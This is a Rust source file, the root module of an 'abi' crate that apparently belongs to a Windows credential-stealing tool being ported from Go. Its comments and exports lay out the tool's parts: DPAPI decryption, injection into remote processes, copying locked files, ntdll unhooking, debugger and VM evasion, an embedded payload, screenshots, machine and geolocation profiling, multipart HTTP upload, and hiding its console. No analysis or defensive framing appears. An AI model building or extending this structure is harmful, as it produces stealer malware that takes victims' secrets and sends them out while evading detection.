//! `abi` — the ONLY crate allowed to touch WinAPI / `unsafe` (PLAN.md R4).
//!
//! Scope (all phases):
//! - DPAPI: `CryptUnprotectData` (crypt32) — Phase 1, [`dpapi`]
//! - Injection: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`,
//!   `WaitForSingleObject`, `TerminateProcess`, `CreateProcess(CREATE_SUSPENDED)`,
//!   `ResumeThread`, `ReadProcessMemory`, `GetExitCodeProcess`, `CloseHandle` — Phase 5
//! - Address patch: `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`,
//!   `NtFlushInstructionCache` — Phase 5
//! - copyLocked: `NtQuerySystemInformation(SystemHandleInformation)`,
//!   `OpenProcess(DUP_HANDLE)`, `DuplicateHandle`, `GetFileType`,
//!   `GetFinalPathNameByHandleW`, `GetFileSizeEx`, `CreateFileMappingW` +
//!   `MapViewOfFile`, `ReadFile` — Phase 2b
//! - Path/exec probe: `ExpandEnvironmentStringsW`, `K32EnumProcesses`,
//!   `QueryFullProcessImageNameW`, registry App Paths — Phase 5
//! - Console: `ShowWindow`/`FreeConsole` (double-click mode) — Phase 4

#[cfg(windows)]
pub mod apitable;
#[cfg(windows)]
pub mod console;
#[cfg(windows)]
pub mod detect;
#[cfg(windows)]
pub mod dpapi;
#[cfg(windows)]
pub mod http;
#[cfg(windows)]
pub mod injector;
#[cfg(windows)]
pub mod obfu;
#[cfg(windows)]
pub mod patch;
#[cfg(windows)]
pub mod payload;
#[cfg(windows)]
pub mod pe;
#[cfg(windows)]
pub mod resolve;
#[cfg(windows)]
pub mod screenshot;
#[cfg(windows)]
pub mod sysinfo;
#[cfg(windows)]
pub mod unhook;
#[cfg(windows)]
pub mod winpaths;

pub mod workdir;
#[cfg(windows)]
pub use console::{configure_double_click_mode, hide_console_window, launched_by_explorer};
#[cfg(windows)]
pub use detect::{debugger_detected, evasion_check, vm_detected};
#[cfg(windows)]
pub use dpapi::{decrypt_dpapi, protect_dpapi};
#[cfg(windows)]
pub use http::{GeoInfo, HttpError, build_multipart, geo_info, post_multipart, public_ip};
#[cfg(windows)]
pub use injector::{InjectError, Injector, inject};
#[cfg(windows)]
pub use patch::{PatchError, patch_preresolved_imports};
#[cfg(windows)]
pub use payload::{KEY_LEN, KEY_STATUS_READY, PAYLOAD_AMD64};
#[cfg(windows)]
pub use pe::{PeArch, PeError, detect_pe_arch, find_export_file_offset};
#[cfg(windows)]
pub use resolve::{api, hash_bytes, module_base};
#[cfg(windows)]
pub use screenshot::{ScreenshotError, screenshot_png};
#[cfg(windows)]
pub use sysinfo::{DiskInfo, MachineInfo, machine_info};
#[cfg(windows)]
pub use unhook::{hooked_bytes, unhook_ntdll};
#[cfg(windows)]
pub use winpaths::{AbeKind, WinpathError, executable_path};

pub use workdir::hidden_temp_dir;

/// Errors produced by the WinAPI surface (all variants carry the raw OS error).
#[derive(Debug, thiserror::Error)]
pub enum AbiError {
    /// Go: `CryptUnprotectData: %w` (dpapi_windows.go).
    #[error("unprotect data: {0}")]
    CryptUnprotectData(windows::core::Error),
    /// Go: `CryptProtectData: %w` (inverse path, used for test fixtures).
    #[error("protect data: {0}")]
    CryptProtectData(windows::core::Error),
    /// Go: `LocalFree` is called without error checking, but a failure here means
    /// the freed pointer is gone while the failure itself is only observable via
    /// the returned handle — treated as fatal for the operation.
    #[error("free memory: {0}")]
    LocalFree(windows::core::Error),
}
